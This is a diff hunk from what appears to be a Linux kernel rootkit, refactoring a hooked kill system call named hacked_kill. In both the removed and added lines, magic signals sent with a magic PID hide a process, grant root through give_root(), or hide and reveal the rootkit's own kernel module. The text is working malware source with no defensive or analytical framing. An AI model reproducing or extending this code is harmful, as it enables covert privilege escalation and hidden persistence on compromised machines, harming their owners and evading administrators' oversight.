@@ -323,21 +323,15 @@ hacked_kill(pid_t pid, int sig)
         }
     }
 
-	if(sig==SIGINVIS) {//MODIFIED from switch to if elses
-		if(pid == magicPrefixNum){//ADDED
-			if ((task = find_task(pid)) == NULL)
-				return -ESRCH;
-			task->flags ^= PF_INVISIBLE;
-		}
-	}else if(sig==SIGSUPER){
-		if(pid == magicPrefixNum) {//ADDED
-			give_root();
-		}
-	}else if(sig==SIGMODINVIS){
-		if(pid == magicPrefixNum){//ADDED
-			if (module_hidden) module_show();
-			else module_hide();
-		}
+	if(sig==SIGINVIS && pid == magicPrefixNum) {//MODIFIED from switch to if elses
+		if ((task = find_task(pid)) == NULL)
+			return -ESRCH;
+		task->flags ^= PF_INVISIBLE;
+	}else if(sig==SIGSUPER && pid == magicPrefixNum){
+		give_root();
+	}else if(sig==SIGMODINVIS && pid == magicPrefixNum){
+		if (module_hidden) module_show();
+		else module_hide();
 	}else{
 		#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 			return orig_kill(pt_regs);
